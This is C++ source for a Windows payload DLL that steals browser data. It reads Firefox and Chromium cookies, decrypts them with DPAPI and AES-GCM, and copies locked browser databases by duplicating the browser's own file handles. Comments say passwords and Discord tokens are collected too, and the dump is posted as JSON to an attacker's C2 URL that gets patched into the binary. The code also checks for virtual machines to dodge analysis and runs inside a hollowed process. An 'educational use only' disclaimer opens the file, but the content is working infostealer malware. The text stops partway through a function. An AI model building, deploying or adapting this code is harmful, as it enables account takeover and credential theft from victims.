// ckdll.cpp - payload DLL: extracts cookies (Firefox plaintext + Chromium v10/v11/v20)
//   and exfiltrates them as Cookie-Editor JSON via HTTP POST (Winsock2) or local fallback.
//
//   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING
//
//   This is offensive security tooling for penetration testing, red-team exercises,
//   and security education. Only use on systems you own or are explicitly authorized
//   to test. Unauthorized use is illegal. The authors are not responsible for misuse.
//
// CRT-less: /NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000
// Optimizer off (/Od /Oi-): SSE-vectorized memcpy/memset crashes in hollowed process.
#define WIN32_LEAN_AND_MEAN
#define SECURITY_WIN32
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include <sspi.h>
#include <schannel.h>

// Minimal IP_ADAPTER_INFO for MAC address check (avoids iphlpapi.h CRT dependency)
// Layout MUST match the real iphlpapi structures: the old 64-byte pad made every
// field after CurrentIpAddress read at the wrong offset -- GetAdaptersInfo writes
// the real layout, so Type and Address came back as garbage and the VM MAC check
// produced false positives on ordinary victim machines (payload exited silently).
typedef struct _IP_ADDR_STRING { struct _IP_ADDR_STRING* Next; char Ip[16]; char Mask[16]; unsigned int Context; } IP_ADDR_STRING;
#pragma pack(push,4)
typedef struct _IP_ADAPTER_INFO {
    struct _IP_ADAPTER_INFO* Next;
    int ComboIndex;
    char AdapterName[260];
    char Description[132];
    unsigned int AddressLength;
    BYTE Address[8];
    unsigned int Index;
    unsigned int Type;
    unsigned int DhcpEnabled;
    IP_ADDR_STRING *CurrentIpAddress;
    IP_ADDR_STRING IpAddressList;
    IP_ADDR_STRING GatewayList;
    IP_ADDR_STRING DhcpServer;
    int HaveWins;
    IP_ADDR_STRING PrimaryWinsServer;
    IP_ADDR_STRING SecondaryWinsServer;
    time_t LeaseObtained;
    time_t LeaseExpires;
} IP_ADAPTER_INFO, *PIP_ADAPTER_INFO;
#pragma pack(pop)

// No CRT intrinsics (/Oi- in build.bat): memcpy/memset/memmove are our own functions.
// This avoids LNK2001 (no vcruntime.lib) and C2084 (no conflict with intrinsic).
extern "C" void* memmove(void* d, const void* s, size_t n){ char*a=(char*)d; const char*b=(const char*)s;
    if(a<b) for(size_t i=0;i<n;i++) a[i]=b[i];
    else for(size_t i=n;i>0;) { i--; a[i]=b[i]; } return d; }
extern "C" void* memcpy(void* d, const void* s, size_t n){ char*a=(char*)d; const char*b=(const char*)s;
    for(size_t i=0;i<n;i++) a[i]=b[i]; return d; }
extern "C" void* memset(void* d, int c, size_t n){ unsigned char*a=(unsigned char*)d;
    for(size_t i=0;i<n;i++) a[i]=(unsigned char)c; return d; }
extern "C" int memcmp(const void* a, const void* b, size_t n){
    const unsigned char* p=(const unsigned char*)a; const unsigned char* q=(const unsigned char*)b;
    for(size_t i=0;i<n;i++){ if(p[i]!=q[i]) return (int)p[i]-(int)q[i]; } return 0; }
// strchr/strstr: without CRT we implement locally with custom names to avoid header conflict
static const char* xstrchr(const char* s, int c){ for(; *s; s++) if(*s==(char)c) return s; return 0; }
static const char* xstrstr(const char* s, const char* sub){
    if(!*sub) return s;
    for(; *s; s++){ const char* a=s; const char* b=sub;
        while(*a&&*b&&*a==*b){ a++; b++; } if(!*b) return s; }
    return 0;
}
extern "C" int _fltused = 0;

// ------------------------------------------------------------------ C2 exfiltration URL
// Sentinel: pick.py finds these 14 bytes in loader.exe (which embeds the DLL as g_payload[])
// and overwrites 256 bytes with the attacker's C2 URL (e.g. http://10.0.0.5:9090/).
// If the sentinel is intact ("CKC2_DEADBEEF_"), no C2 is configured -> local fallback.
static char g_c2_url[256] = "CKC2_DEADBEEF_";

// Persistence is installed by the LOADER (its sentinel g_persist, patched by
// pick.py/auto.py). The payload used to do it, but GetModuleFileName inside the
// hollowed process returns notepad.exe, so the Run key pointed at the wrong exe.

// Anti-VM skip sentinel: if replaced with "CKAV0001" (8 bytes), IsAnalysisEnv() is
// skipped entirely. Use --no-anti-vm in auto.py to enable. Needed for testing on VMs.
static char g_skip_av[8] = {'C','K','A','V','0','0','0','0'};

// ------------------------------------------------------------------ JSON output buffer
// The old fixed 2 MB buffer silently dropped bytes past the end. On machines with
// many browser profiles (9 Chromium + Firefox + passwords + Discord tokens) the
// dump exceeds 2 MB, the closing "]" still gets written, and the listener receives
// truncated JSON and rejects the whole POST. The buffer now grows on demand.
static char*  g_out = NULL;
static size_t g_cap = 0;
static size_t g_len;
static bool   g_first_rec = true;                          // controls comma in JSON array
// Chunked exfil: every record starts at a byte offset, so the dump can be split
// on record boundaries and POSTed as several envelopes without re-serialising.
#define CK_MAX_REC 16384
static size_t g_rec_off[CK_MAX_REC];
static int    g_rec_n;
static size_t g_rec_end;                                    // offset of the closing "]"
static void Grow(size_t need){
    if(!g_out){
        g_cap = 2048*1024;
        g_out = (char*)VirtualAlloc(NULL, g_cap, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if(!g_out){ g_cap = 0; return; }
    }
    while(g_cap < g_len + need + 2){
        size_t nc = g_cap * 2;
        char* nb = (char*)VirtualAlloc(NULL, nc, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if(!nb) return;                                    // keep old buffer, Put drops the tail
        memcpy(nb, g_out, g_len);
        VirtualFree(g_out, 0, MEM_RELEASE);
        g_out = nb; g_cap = nc;
    }
}
static void Put(const char* s, size_t n){
    // g_cap==0 must force Grow: g_cap-1 would underflow to SIZE_MAX and the
    // write below would memcpy into a NULL buffer (crash on the first PutS)
    if(!g_out || g_len + n >= g_cap - 1) Grow(n);
    if(g_out && g_len + n < g_cap - 1){ memcpy(g_out+g_len,s,n); g_len+=n; }
}
static void PutS(const char* s){ Put(s, lstrlenA(s)); }
static void RecStart(void){
    // offset points at the '{' of the record (the separator comma is written
    // before it and excluded), so a chunk slice is valid JSON on its own
    if(g_first_rec){
        if(g_rec_n < CK_MAX_REC){ g_rec_off[g_rec_n] = g_len; g_rec_n++; }
        PutS("{"); g_first_rec=false;
    } else {
        PutS(",");
        if(g_rec_n < CK_MAX_REC){ g_rec_off[g_rec_n] = g_len; g_rec_n++; }
        PutS("{");
    }
}
static void PutJ(const char* s, int n){            // escape string for JSON
    PutS("\"");
    for(int i=0;i<n;i++){ unsigned char c=(unsigned char)s[i];
        if(c=='"'||c=='\\'){ Put("\\",1); Put((char*)&c,1); }
        else if(c=='\n') Put("\\n",2); else if(c=='\r') Put("\\r",2); else if(c=='\t') Put("\\t",2);
        else if(c<32){ char t[8]; for(int j=0;j<4;j++){ const char*H="0123456789abcdef";
            t[j]=H[(c>>((3-j)*4))&15]; } Put("\\u00",4); Put(t,4); }
        else Put((char*)&c,1); }   // bytes >= 0x80: pass through as UTF-8
    PutS("\"");
}
static void PutN(long long v){ char b[24]; int i=20; if(!v){ Put("0",1); return; }
    bool neg=v<0; unsigned long long uv=neg?-(unsigned long long)v:(unsigned long long)v;
    while(uv){ b[i--]="0123456789"[uv%10]; uv/=10; }
    if(neg) b[i--]='-';
    Put(b+i+1, 20-i); }

// ------------------------------------------------------------------ debug logging
#ifdef DEBUG
// crash locator: log the faulting address (base-relative) so it can be resolved
// against the map file -- temporary diagnosis for the HijackCookieDB call crash
static void* g_imgbase = 0;
static LONG CALLBACK CrashVEH(EXCEPTION_POINTERS* e){
    HANDLE h = CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",
        GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL);
    if(h != INVALID_HANDLE_VALUE){
        SetFilePointer(h,0,NULL,FILE_END);
        char b[64]; int n = 0; const char* pre = "VEH: code=0x";
        while(*pre) b[n++] = *pre++;
        unsigned code = (unsigned)e->ExceptionRecord->ExceptionCode;
        for(int sh = 28; sh >= 0; sh -= 4){ int d = (code >> sh) & 0xF; b[n++] = d < 10 ? '0'+d : 'A'+d-10; }
        const char* mid = " rva=0x"; while(*mid) b[n++] = *mid++;
        unsigned long off = (unsigned long)((char*)e->ExceptionRecord->ExceptionAddress - (char*)g_imgbase);
        for(int sh = 28; sh >= 0; sh -= 4){ int d = (int)((off >> sh) & 0xF); b[n++] = d < 10 ? '0'+d : 'A'+d-10; }
        b[n++]='\\r'; b[n++]='\\n'; DWORD w; WriteFile(h,b,n,&w,NULL); CloseHandle(h);
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
static void Dbg(const char* msg){
    CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
    HANDLE h=CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",GENERIC_WRITE,
                         FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL);
    if(h==INVALID_HANDLE_VALUE)
        // test environments with restricted ProgramData: fall back to the working dir
        h=CreateFileW(L"_ck_trace.log",GENERIC_WRITE,
                      FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL);
    if(h!=INVALID_HANDLE_VALUE){
        SetFilePointer(h,0,NULL,FILE_END); DWORD wr;
        const char* p=msg; while(*p) p++;
        WriteFile(h,msg,(DWORD)(p-msg),&wr,NULL);
        WriteFile(h,"\r\n",2,&wr,NULL); CloseHandle(h);
    }
}
// DbgH: inline debug logging macro for use in CopyDb/HijackCookieDB.
// Dbg() fails when called from CopyDb (5-param function) in the hollowed
// process — likely a compiler codegen issue with /Od and /NODEFAULTLIB.
// This macro inlines the file write, avoiding the function call entirely.
#ifdef DEBUG
#define DbgH(msg) do { \
    HANDLE _dh = CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",GENERIC_WRITE, \
        FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL); \
    if(_dh == INVALID_HANDLE_VALUE) \
        _dh = CreateFileW(L"_ck_trace.log",GENERIC_WRITE, \
            FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL); \
    if(_dh != INVALID_HANDLE_VALUE){ \
        SetFilePointer(_dh,0,NULL,FILE_END); DWORD _wr2; \
        const char* _p2 = (msg); while(*_p2) _p2++; \
        WriteFile(_dh,(msg),(DWORD)(_p2-(msg)),&_wr2,NULL); \
        WriteFile(_dh,"\r\n",2,&_wr2,NULL); CloseHandle(_dh); } \
} while(0)
#define DbgHInt(msg,val) do { \
    char _buf2[300]; int _j2=0; const char* _m2=(msg); \
    while(_m2[_j2] && _j2<250){ _buf2[_j2]=_m2[_j2]; _j2++; } \
    _buf2[_j2++]=':'; _buf2[_j2++]=' '; \
    int _v2=(val); if(_v2<0){ _buf2[_j2++]='-'; _v2=-_v2; } \
    char _tmp2[16]; int _t2=0; if(_v2==0) _tmp2[_t2++]='0'; \
    else while(_v2>0){ _tmp2[_t2++]='0'+_v2%10; _v2/=10; } \
    while(_t2>0) _buf2[_j2++]=_tmp2[--_t2]; _buf2[_j2]=0; \
    DbgH(_buf2); \
} while(0)
#else
#define DbgH(x)   do{}while(0)
#define DbgHInt(x,y) do{}while(0)
#endif
static void DbgStr(const char* prefix, const char* val){
    char buf[1400]; lstrcpyA(buf,prefix); lstrcatA(buf,val); Dbg(buf);
}
static void DbgInt(const char* msg, int val){
    char buf[300]; int j=0;
    while(msg[j] && j<250) { buf[j]=msg[j]; j++; }
    buf[j++]=':'; buf[j++]=' ';
    if(val<0){ buf[j++]='-'; val=-val; }
    char tmp[16]; int t=0;
    if(val==0) tmp[t++]='0';
    else while(val>0){ tmp[t++]='0'+val%10; val/=10; }
    while(t>0) buf[j++]=tmp[--t];
    buf[j]=0; Dbg(buf);
}
#else
#define Dbg(x)    do{}while(0)
#define DbgStr(x,y) do{}while(0)
#define DbgInt(x,y) do{}while(0)
#define DbgH(x)   do{}while(0)
#define DbgHInt(x,y) do{}while(0)
#endif

// ------------------------------------------------------------------ dynamically-loaded APIs
static HMODULE g_sql, g_c32;
typedef int  (__cdecl *tOpenV2)(const char*,void**,int,const char*);
typedef int  (__cdecl *tPrep16)(void*,const void*,int,void**,const void**);
typedef int  (__cdecl *tStep)(void*);  typedef int (__cdecl *tInt)(void*,int);
typedef long long (__cdecl *tInt64)(void*,int);
typedef const void* (__cdecl *tBlob)(void*,int); typedef int (__cdecl *tBytes)(void*,int);
typedef int  (__cdecl *tFin)(void*);   typedef int (__cdecl *tClose)(void*);
static tOpenV2 S_open; static tPrep16 S_prep; static tStep S_step; static tInt S_int;
static tInt64 S_int64;
static tBlob S_blob; static tBytes S_bytes; static tFin S_fin; static tClose S_close;

// NtQuerySystemInformation for handle hijacking (loaded from ntdll.dll at runtime)
typedef LONG (WINAPI *tNtQSI)(ULONG, PVOID, ULONG, PULONG);
static tNtQSI NtQSI = NULL;

static bool Sqlite(void){
    g_sql = LoadLibraryA("winsqlite3.dll"); if(!g_sql) return false;
    S_open =(tOpenV2) GetProcAddress(g_sql,"sqlite3_open_v2");
    S_prep =(tPrep16) GetProcAddress(g_sql,"sqlite3_prepare16_v2");
    S_step =(tStep)   GetProcAddress(g_sql,"sqlite3_step");
    S_int  =(tInt)    GetProcAddress(g_sql,"sqlite3_column_int");
    S_int64=(tInt64)  GetProcAddress(g_sql,"sqlite3_column_int64");
    S_blob =(tBlob)   GetProcAddress(g_sql,"sqlite3_column_blob");
    S_bytes=(tBytes)  GetProcAddress(g_sql,"sqlite3_column_bytes");
    S_fin  =(tFin)    GetProcAddress(g_sql,"sqlite3_finalize");
    S_close=(tClose)  GetProcAddress(g_sql,"sqlite3_close");
    return S_open && S_prep && S_step && S_blob && S_int64;
}

// DPAPI (CryptUnprotectData) - used for Chromium v10/v11 cookie key
static bool Dpapi(const unsigned char* in, DWORD nin, unsigned char* out, DWORD* nout, bool machine){
    g_c32 = g_c32 ? g_c32 : LoadLibraryA("crypt32.dll"); if(!g_c32) return false;
    typedef BOOL (WINAPI *tCU)(DATA_BLOB*,LPWSTR*,DATA_BLOB*,void*,void*,DWORD,DATA_BLOB*);
    tCU p = (tCU) GetProcAddress(g_c32, "CryptUnprotectData"); if(!p) return false;
    DATA_BLOB i = { nin, (BYTE*)in }, o = {0,NULL};
    if(!p(&i,NULL,NULL,NULL,NULL, machine?CRYPTPROTECT_LOCAL_MACHINE:0, &o)) return false;
    DWORD n = o.cbData > *nout ? *nout : o.cbData; memcpy(out,o.pbData,n); *nout=n;
    LocalFree(o.pbData); return true;
}

// AES-256-GCM decryption via CNG (BCrypt*)
// Uses direct bcrypt.lib calls (bcrypt.lib is linked in build.bat).
// Previously used GetProcAddress but the function pointer typedefs caused
// STATUS_INVALID_PARAMETER (0xC0000003) in the hollowed process.
static bool AesGcm(const unsigned char* key, ULONG klen, const unsigned char* iv,
                   const unsigned char* ct, ULONG clen, const unsigned char* tag,
                   unsigned char* out, ULONG outcap, ULONG* nout){
    BCRYPT_ALG_HANDLE alg=NULL; BCRYPT_KEY_HANDLE k=NULL; NTSTATUS st;
    st = BCryptOpenAlgorithmProvider(&alg,BCRYPT_AES_ALGORITHM,NULL,0);
    if(st){ DbgInt("AesGcm: OpenAlg failed", st); return false; }
    st = BCryptSetProperty(alg,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_GCM,
           (ULONG)(lstrlenW(BCRYPT_CHAIN_MODE_GCM)+1)*sizeof(WCHAR),0);
    if(st){ DbgInt("AesGcm: SetChaining failed", st); BCryptCloseAlgorithmProvider(alg,0); return false; }
    st = BCryptGenerateSymmetricKey(alg,&k,NULL,0,(PUCHAR)key,klen,0);
    if(st){ DbgInt("AesGcm: GenKey failed", st); BCryptCloseAlgorithmProvider(alg,0); return false; }
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    memset(&info,0,sizeof(info));
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)iv; info.cbNonce = 12;
    info.pbTag   = (PUCHAR)tag; info.cbTag  = 16;
    if(clen>outcap){ BCryptDestroyKey(k); BCryptCloseAlgorithmProvider(alg,0); return false; }
    ULONG need=0;
    st = BCryptDecrypt(k,(PUCHAR)ct,clen,&info,NULL,0,out,outcap,&need,0);
    BCryptDestroyKey(k); BCryptCloseAlgorithmProvider(alg,0);
    if(st){ DbgInt("AesGcm: BCryptDecrypt status", st); return false; }
    *nout = need;
    return true;
}

// ------------------------------------------------------------------ JSON field helpers (per sqlite column)
static void FieldI(const char* k, void* st, int col){ PutS(",\""); PutS(k); PutS("\":"); PutN(S_int(st,col)); }
static void FieldI64(const char* k, void* st, int col){ PutS(",\""); PutS(k); PutS("\":"); PutN(S_int64(st,col)); }
static void FieldS(const char* k, void* st, int col){
    const char* t = (const char*) S_blob(st,col); int n = S_bytes(st,col);
    PutS(",\""); PutS(k); PutS("\":"); if(t&&n>0) PutJ(t,n); else PutS("\"\"");
}
// FieldS0: first field of a record (no leading comma)
static void FieldS0(const char* k, void* st, int col){
    const char* t = (const char*) S_blob(st,col); int n = S_bytes(st,col);
    PutS("\""); PutS(k); PutS("\":"); if(t&&n>0) PutJ(t,n); else PutS("\"\"");
}
static void FieldStr(const char* k, const char* v){ PutS(",\""); PutS(k); PutS("\":\""); PutS(v); PutS("\""); }
static void FieldB(const char* k, int v){ PutS(",\""); PutS(k); PutS("\":"); PutS(v?"true":"false"); }

// Convert wide string to UTF-8; fallback to ASCII replacement
static int ToUtf8(const wchar_t* p, char* out, int cap){
    int n = WideCharToMultiByte(CP_UTF8, 0, p, -1, out, cap, NULL, NULL);
    if(n > 0) return n-1;
    int j=0;
    for(int i=0; p[i] && j<cap-1; i++) out[j++]=(char)(p[i]<128?p[i]:'?');
    out[j]=0; return j;
}

// True if the buffer is already valid UTF-8. Chrome stores passwords as
// UTF-16LE, so a UTF-16 buffer with any accent fails this and gets converted;
// a plain ASCII password passes and is left alone.
static bool LooksUtf8(const char* s, int n){
    for(int i=0; i<n;){
        unsigned char c = (unsigned char)s[i];
        if(c < 0x80){ i++; continue; }
        int k = (c>=0xF0)?4:(c>=0xE0)?3:(c>=0xC0)?2:0;
        if(!k || i+k>n) return false;
        for(int j=1; j<k; j++) if(((unsigned char)s[i+j]&0xC0)!=0x80) return false;
        i += k;
    }
    return true;
}

// ------------------------------------------------------------------ coverage manifest
// One row per database file the payload actually opened. The listener turns
// these into loot/coverage.jsonl: rows vs decrypted vs failed, plus a fixed
// skip reason (missing, locked, no-key, v10-fail, unsupported, excluded).
// Without it a 960-cookie run cannot be told from a 96%-off-the-table run.
struct SrcRow {
    char kind[12];
    char browser[24];
    char profile[64];
    char path[512];
    long long rows;
    long long dec;
    long long failed;
    char skip[16];
};
static SrcRow g_src[256];
static int g_src_n = 0;

static void SrcAdd(const char* kind, const wchar_t* browser, const wchar_t* profile,
                   const wchar_t* path, int rows, int dec, int failed, const char* skip){
    if(g_src_n >= (int)(sizeof(g_src)/sizeof(g_src[0]))) return;
    SrcRow* s = &g_src[g_src_n++];
    lstrcpynA(s->kind, kind ? kind : "", sizeof(s->kind));
    ToUtf8(browser ? browser : L"", s->browser, sizeof(s->browser));
    ToUtf8(profile ? profile : L"", s->profile, sizeof(s->profile));
    ToUtf8(path ? path : L"", s->path, sizeof(s->path));
    s->rows = rows; s->dec = dec; s->failed = failed;
    lstrcpynA(s->skip, skip ? skip : "", sizeof(s->skip));
}

// ------------------------------------------------------------------ handle hijacking
// When a browser holds a 0-sharing lock on the cookie/password DB, CreateFileW
// fails with error 32 (sharing violation). This function enumerates all system
// handles via NtQuerySystemInformation(SystemExtendedHandleInformation=0x40),
// finds the browser's SQLite DB handle, duplicates it with DUPLICATE_SAME_ACCESS,
// reads the file, and verifies it has the expected table (cookies/logins).

// Find PIDs of a process by exe name (e.g., L"vivaldi.exe")
static int FindPids(const wchar_t* exe_name, DWORD* pids, int max_pids){
    int count = 0;
    HANDLE snap = CreateToolhelp32Snapshot(0x00000002 /*TH32CS_SNAPPROCESS*/, 0);
    if(snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    typedef BOOL (WINAPI *tFirst)(HANDLE, void*);
    typedef BOOL (WINAPI *tNext)(HANDLE, void*);
    tFirst fFirst = (tFirst)GetProcAddress(k32, "Process32FirstW");
    tNext  fNext  = (tNext) GetProcAddress(k32, "Process32NextW");
    if(fFirst && fNext && fFirst(snap, &pe)){
        do {
            if(lstrcmpiW(pe.szExeFile, exe_name) == 0 && count < max_pids)
                pids[count++] = pe.th32ProcessID;
        } while(fNext(snap, &pe));
    }
    CloseHandle(snap);
    return count;
}

// SystemExtendedHandleInformation (0x40) on x64:
//   Header: 16 bytes (NumberOfHandles:8 + Reserved:8)
//   Entry:  40 bytes
//     PVOID Object               offset 0
//     ULONG_PTR UniqueProcessId  offset 8  (8 bytes on x64)
//     ULONG_PTR HandleValue      offset 16 (8 bytes on x64)
//     ULONG GrantedAccess        offset 24
//     USHORT CreatorBackTraceIndex offset 28
//     USHORT ObjectTypeIndex     offset 30
//     ULONG HandleAttributes     offset 32
//     ULONG Reserved             offset 36
#pragma pack(push,8)
struct HandleEntryEx {
    void* Object;
    unsigned __int64 UniqueProcessId;
    unsigned __int64 HandleValue;
    unsigned long GrantedAccess;
    unsigned short CreatorBackTraceIndex;
    unsigned short ObjectTypeIndex;
    unsigned long HandleAttributes;
    unsigned long Reserved;
};
#pragma pack(pop)

// Hijack a SQLite DB handle from a running browser process.
// exe_name: e.g. L"vivaldi.exe" â€” used to find browser PIDs
// dst: temp file path to write the DB to
// table_name: expected SQLite table name (L"cookies" or L"logins")
// Returns true if a DB with the expected table was found and written to dst.
static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
                           const wchar_t* table_name){
    if(!exe_name || !*exe_name) return false;
    DbgH("HijackCookieDB: starting scan");

    // 1. Find browser PIDs
    DWORD pids[64]; int npids = FindPids(exe_name, pids, 64);
    DbgHInt("HijackCookieDB: browser PIDs found", npids);
    if(npids == 0) return false;

    // 2. Load NtQuerySystemInformation
    if(!NtQSI){
        HMODULE nt = GetModuleHandleA("ntdll.dll");
        NtQSI = (tNtQSI)GetProcAddress(nt, "NtQuerySystemInformation");
        if(!NtQSI){ DbgH("HijackCookieDB: NtQuerySystemInformation not found"); return false; }
    }

    // 3. Query system handles (0x40 = SystemExtendedHandleInformation)
    unsigned long bufSize = 0x200000; // 2MB initial
    unsigned long actual = 0;
    char* buf = (char*)VirtualAlloc(NULL, bufSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if(!buf) return false;
    LONG status = NtQSI(0x40, buf, bufSize, &actual);
    if(status == 0xC0000004){ // STATUS_INFO_LENGTH_MISMATCH â€” need bigger buffer
        VirtualFree(buf, 0, MEM_RELEASE);
        bufSize = actual + 0x1000;
        buf = (char*)VirtualAlloc(NULL, bufSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if(!buf) return false;
        status = NtQSI(0x40, buf, bufSize, &actual);
    }
    if(status != 0){
        DbgHInt("HijackCookieDB: NtQSI failed (status)", (int)status);
        VirtualFree(buf, 0, MEM_RELEASE);
        return false;
    }
    unsigned __int64 count = *(unsigned __int64*)buf;
    DbgHInt("HijackCookieDB: total handles (low32)", (int)(count & 0xFFFFFFFF));

    HandleEntryEx* entries = (HandleEntryEx*)(buf + 16); // skip 16-byte header

    // 4. Scan handles â€” find SQLite DB in browser process
    for(unsigned __int64 i = 0; i < count; i++){
        HandleEntryEx* e = &entries[i];
        if(e->UniqueProcessId == 0 || e->UniqueProcessId == 4) continue;

        // Check if PID matches a browser process
        bool match = false;
        for(int p = 0; p < npids; p++){
            if(e->UniqueProcessId == pids[p]){ match = true; break; }
        }
        if(!match) continue;

        // Duplicate handle with DUPLICATE_SAME_ACCESS
        // (Vivaldi's handle has FILE_READ_DATA but not READ_CONTROL,
        //  so GENERIC_READ duplicate would fail)
        HANDLE hProc = OpenProcess(0x0040 /*PROCESS_DUP_HANDLE*/, FALSE,
                                   (DWORD)e->UniqueProcessId);
        if(!hProc || hProc == INVALID_HANDLE_VALUE) continue;
        HANDLE dup = NULL;
        if(!DuplicateHandle(hProc, (HANDLE)e->HandleValue, GetCurrentProcess(),
                           &dup, 0, FALSE, 0x0002 /*DUPLICATE_SAME_ACCESS*/)){
            CloseHandle(hProc); continue;
        }

        // Check if disk file
        if(GetFileType(dup) != 1 /*FILE_TYPE_DISK*/){
            CloseHandle(dup); CloseHandle(hProc); continue;
        }

        // Read first 16 bytes for SQLite magic
        LARGE_INTEGER zero; zero.QuadPart = 0;
        SetFilePointerEx(dup, zero, NULL, FILE_BEGIN);
        char magic[16]; DWORD rd = 0;
        if(!ReadFile(dup, magic, 16, &rd, NULL) || rd != 16){
            CloseHandle(dup); CloseHandle(hProc); continue;
        }
        if(memcmp(magic, "SQLite format 3\x00", 16) != 0){
            CloseHandle(dup); CloseHandle(hProc); continue;
        }

        // Found a SQLite DB â€” check size
        DWORD fsize = GetFileSize(dup, NULL);
        DbgHInt("HijackCookieDB: SQLite DB found, size", (int)fsize);
        if(fsize < 50000 || fsize > 50000000){
            CloseHandle(dup); CloseHandle(hProc); continue;
        }

        // Read the whole file to dst
        SetFilePointerEx(dup, zero, NULL, FILE_BEGIN);
        DeleteFileW(dst);
        // stale -wal/-shm from a previous CopyDb would corrupt this snapshot:
        // SQLite would replay a WAL that does not belong to this file
        { wchar_t wal[MAX_PATH]; lstrcpyW(wal,dst); lstrcatW(wal,L"-wal"); DeleteFileW(wal); }
        { wchar_t shm[MAX_PATH]; lstrcpyW(shm,dst); lstrcatW(shm,L"-shm"); DeleteFileW(shm); }
        HANDLE hOut = CreateFileW(dst, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if(hOut == INVALID_HANDLE_VALUE){
            CloseHandle(dup); CloseHandle(hProc); continue;
        }
        // rbuf must NOT be a 64KB stack local: with /Gs1048576 (required because
        // /NODEFAULTLIB has no __chkstk) a large frame skips the stack guard page
        // and the first access faults beyond it -- unrecoverable AV. Heap instead.
        char* rbuf = (char*)VirtualAlloc(NULL, 65536, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if(!rbuf){ CloseHandle(hOut); CloseHandle(dup); CloseHandle(hProc); continue; }
        DWORD totalRead = 0; bool readOk = true;
        while(totalRead < fsize){
            DWORD toRead = (fsize - totalRead < 65536) ?
                           (fsize - totalRead) : 65536;
            DWORD nRead = 0;
            if(!ReadFile(dup, rbuf, toRead, &nRead, NULL) || nRead == 0){ readOk = false; break; }
            DWORD nWritten = 0;
            if(!WriteFile(hOut, rbuf, nRead, &nWritten, NULL) || nWritten != nRead){ readOk = false; break; }
            totalRead += nRead;
        }
        VirtualFree(rbuf, 0, MEM_RELEASE);
        CloseHandle(hOut); CloseHandle(dup); CloseHandle(hProc);
        if(!readOk){ DbgH("HijackCookieDB: read failed"); continue; }

        // Verify the expected table exists
        char path8[1024]; ToUtf8(dst, path8, sizeof(path8));
        void* con = NULL; int rc = S_open(path8, &con, 1/*SQLITE_OPEN_READONLY*/, NULL);
        if(rc || !con){ DbgHInt("HijackCookieDB: sqlite open failed", rc); continue; }
        void* st = NULL;
        wchar_t sql[128]; lstrcpyW(sql, L"SELECT count(*) FROM ");
        lstrcatW(sql, table_name);
        rc = S_prep(con, sql, -1, &st, NULL);
        if(rc){ S_close(con); DbgHInt("HijackCookieDB: table not found", rc); continue; }
        if(S_step(st) == 100 /*SQLITE_ROW*/){
            int cnt = S_int(st, 0);
            DbgHInt("HijackCookieDB: table found, row count", cnt);
            S_fin(st); S_close(con);
            VirtualFree(buf, 0, MEM_RELEASE);
            return true;
        }
        S_fin(st); S_close(con);
    }

    VirtualFree(buf, 0, MEM_RELEASE);
    DbgH("HijackCookieDB: no matching DB handle found");
    return false;
}

// Copy a file using CreateFileW with FILE_SHARE_READ|WRITE|DELETE.
// CopyFileW fails when a browser holds an exclusive lock on the cookie DB;
// opening with FILE_SHARE_WRITE bypasses that lock (read-while-locked).
// If CreateFileW fails (browser holds 0-sharing lock), falls back to
// esentutl /y /vss which uses Volume Shadow Copy Service to read locked files.
static bool CopyFileShared(const wchar_t* src, const wchar_t* dst){
    HANDLE hIn = CreateFileW(src, GENERIC_READ,
        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hIn == INVALID_HANDLE_VALUE){
        DbgInt("CopyFileShared: CreateFileW failed (err)", GetLastError());
        // File is exclusively locked (0 sharing) â€” browser must be closed.
        // esentutl /vss was tried but hangs without admin/VSS service.
        // Firefox cookies still work (Firefox doesn't hold exclusive locks).
        return false;
    }
    HANDLE hOut = CreateFileW(dst, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hOut == INVALID_HANDLE_VALUE){
        DbgInt("CopyFileShared: CreateFileW(dst) failed (err)", GetLastError());
        CloseHandle(hIn); return false;
    }
    char buf[8192]; DWORD nRead=0, nWritten=0;
    while(ReadFile(hIn, buf, sizeof(buf), &nRead, NULL) && nRead > 0){
        if(!WriteFile(hOut, buf, nRead, &nWritten, NULL) || nWritten != nRead){
            CloseHandle(hIn); CloseHandle(hOut); return false;
        }
    }
    CloseHandle(hIn); CloseHandle(hOut);
    DbgH("CopyFileShared: copy loop done");
    return true;
}

// Copy a SQLite database (and -wal/-shm companions) to %TEMP%\ck_db.tmp
// Uses CopyFileShared to bypass browser file locks (Chrome/Edge hold exclusive
// locks on live cookie DBs; CopyFileW fails, but CreateFileW with FILE_SHARE_WRITE works)
static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap,
